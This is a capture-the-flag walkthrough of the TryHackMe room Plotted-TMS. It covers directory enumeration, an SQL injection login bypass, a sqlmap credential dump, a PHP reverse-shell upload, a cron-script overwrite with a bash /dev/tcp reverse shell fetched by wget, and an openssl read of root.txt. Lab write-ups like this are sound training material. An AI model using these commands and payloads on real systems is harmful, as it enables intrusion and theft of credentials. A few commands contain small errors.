# Plotted-TMS

“Everything here is plotted!”

A Detailed walkthrough on the [TryHackMe](http://tryhackme.com) room Plotted-TMS by [3J0SKA](http://github.com/3j0ska).

## 1 -Enumeration And Scanning

First we will start with general enumeration, I am going to use Nmap for the scan. 

![Untitled](Plotted-TM%20f5749/Untitled.png)

After the scan we know that port 22,80,445 are open.

## 2- Enumerating The Web Services

Now its time to enumerate the HTTP ports, let’s start with port 80. On visiting the IP it just shows a default apache2 page. 

![Untitled](Plotted-TM%20f5749/Untitled%201.png)

So now I decided to run a `gobuster` scan to find some directories. 

Command Used :

```bash
gobuster dir -u http://10.10.223.60/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 55
```

After running the scan, It found 3 directories which had promising names. 

![Untitled](Plotted-TM%20f5749/Untitled%202.png)

In visiting the `/admin` page I just found a `id_rsa` file, well not a file it was just a single line 😢.

So then I checked the `/shadow` directory and found a base64 hash there. 

```bash
bm90IHRoaXMgZWFzeSA6RA==
```

After cracking the hash we get this.

![Untitled](Plotted-TM%20f5749/Untitled%203.png)

Let’s move onto the other HTTP port (445). After visiting the page it still shows a default apache2 page. So I decided to run a `gobuster` scan again.

![Untitled](Plotted-TM%20f5749/Untitled%204.png)

That looks interesting, on visiting the website we do not find anything important. 

![Untitled](Plotted-TM%20f5749/Untitled%205.png)

So I decided to run a `gobuster` scan again on the `/management` directory. The scan found a lots of interesting directories. 

![Untitled](Plotted-TM%20f5749/Untitled%206.png)

`/admin` was interesting, so I decided to visit and it redirected me to a login page.

![Untitled](Plotted-TM%20f5749/Untitled%207.png)

So I decided to use a SQLI payload here to bypass the login form, and it worked!

Payload used : `' or 1=1 -- -`

Now we have access to the admin dashboard!

![Untitled](Plotted-TM%20f5749/Untitled%208.png)

## 3- Exploiting SQLI

### NOTE : In the end It all came down to a rabbit hole which led me nowhere, so you can skip this part. You can continue if you wanna learn about basic SQLI!

So after searching for vulnerabilities online, I read that the CMS is full of SQL Injection vulnerabilities so I started to try to find a injection point.

So I clicked on Drivers List.

![Untitled](Plotted-TM%20f5749/Untitled%209.png)

And then there was a driver already listed in the website with some detailes.

![Untitled](Plotted-TM%20f5749/Untitled%2010.png)

So I clicked on Edit.

![Untitled](Plotted-TM%20f5749/Untitled%2011.png)

After you click on Edit you will see a parameter pop up in the URL of the page. 

![Untitled](Plotted-TM%20f5749/Untitled%2012.png)

So I decided to use the same SQLI payload here, if the result do show up even after the payload then the website is most likely vulnerable to SQLI injection. 

![Untitled](Plotted-TM%20f5749/Untitled%2013.png)

After injection I could still see the details, which shows that it is indeed vulnerable, now let’s intercept the request using `burpsuite` and save it.

Note : Make sure you remove the payload from the parameter, as having the payload in the request will make `sqlmap` to throw weird errors.

To save the request, just right click and click on Save Item.

Let’s run a scan to found out all of the databases present!

![Untitled](Plotted-TM%20f5749/Untitled%2014.png)

Note : Make sure to add `-p id` to specify that we are testing only the `id` parameter, as the request you have saved will also have a parameter named `page`.

Now we have 2 databases! 

![Untitled](Plotted-TM%20f5749/Untitled%2015.png)

The database `tmb_db` looks more interesting, let’s check the tables in it.

Command Used : 

```bash
sqlmap -r req.req -p id -D tms_db --tables --threads 10
```

After this I found tons of tables but `users` caught my attention. 

![Untitled](Plotted-TM%20f5749/Untitled%2016.png)

Now I ran the scan to find the columns present in `users` table and found 10 columns.

Command Used : 

```bash
sqlmap -r req.req -p id -D tms_db -T users --columns --threads 10
```

These are the columns found. 

![Untitled](Plotted-TM%20f5749/Untitled%2017.png)

Now out of these columns `username`, `password` and `id` seems to be interesting, so let’s dump them.

Command used : 

```bash
sqlmap -r req.req -p id -D tms_db -T users -C username,password,id --dump --threads 10
```

After this I found 2 hashes one of which is of admin’s password, let’s crack it. 

![Untitled](Plotted-TM%20f5749/Untitled%2018.png)

At first [crackstation.net](http://crackstation.net) couln’t crack the `admin's` hash but was able to crack the hash of `puser`

![Untitled](Plotted-TM%20f5749/Untitled%2019.png)

## 4- Remote Code Execution

I also read that the website is full of RCE, so I decided to find some scripts to automate the task and found this. 

So after some research I found that the “profile updater” if vulnerable to insecure file upload so I decided to upload `.php` reverse shell and received a shell.  

Here are the steps to receive the reverse shell.

1- Click on the Administrator Admin button above.

![Untitled](Plotted-TM%20f5749/Untitled%2020.png)

2- Click on My Account.

![Untitled](Plotted-TM%20f5749/Untitled%2021.png)

3- Setting up a reverse shell.

![Untitled](Plotted-TM%20f5749/Untitled%2022.png)

4- Scroll down and click Browse to select your new avatar and select the PHP reverse shell. 

![Untitled](Plotted-TM%20f5749/Untitled%2023.png)

5- Click Update.

![Untitled](Plotted-TM%20f5749/Untitled%2024.png)

6- Boom! You have the shell! 

![Untitled](Plotted-TM%20f5749/Untitled%2025.png)

## 5- Privilege Escalation [1]

So now we need more perms to actually access the `user.txt`.

Now I started trying some classic privilege escalation techniques, and found a interesting cronjob.

 

![Untitled](Plotted-TM%20f5749/Untitled%2026.png)

The contents of the file shows that the cronjob just saves backup files. 

Content : 

```bash
!/bin/bash

/usr/bin/rsync -a /var/www/html/management /home/plot_admin/tms_backup
/bin/chmod -R 770 /home/plot_admin/tms_backup/management
```

Apparently we can’t write to the file but we can write on the directory, so we can just delete this file and make a new one with the shell in it. Make sure the file has the same name.

So first set up a python HTTP server.

```bash
python2 -m SimpleHTTPServer 8082
```

Then make the file `[backup.sh](http://backup.sh)` on your system and save the following content in it. 

```bash
#!/bin/bash
/bin/sh -i >& /dev/tcp/10.17.44.71/4445 0>&1
```

Now `wget` the file to save it into the victim (make sure the original [backup.sh](http://backup.sh) is deleted) 

```bash
wget http://10.17.44.71:8082/backup.sh
```

Now give perms to the file. 

```bash
chmod +x backup.sh
```

Now after sometime you should receive the shell.

![Untitled](Plotted-TM%20f5749/Untitled%2027.png)

And now we also have the user.txt file!

## 6- Privilege Escalation

Now we have the `user.txt` let’s find the `root.txt`.

To do some enumeration I decided to run `[linpeas.sh](http://linpeas.sh)` in the system, you can transport the file from the local system to victim using the same technique we used to transport `[backup.sh](http://backup.sh)` as the victim can’t access the internet.

Let’s run it up!

After the scan, linpeas found this.

![Untitled](Plotted-TM%20f5749/Untitled%2028.png)

So I checked the GTFObins page for openssl and found this. 

![Untitled](Plotted-TM%20f5749/Untitled%2029.png)

So to get root, follow the following commands. 

1-

```bash
LFILE = /root/root.txt
```

2-

```bash
doas openssl enc -in "$LFILE"
```

And now we have `root.txt`.

![Untitled](Plotted-TM%20f5749/Untitled%2030.png)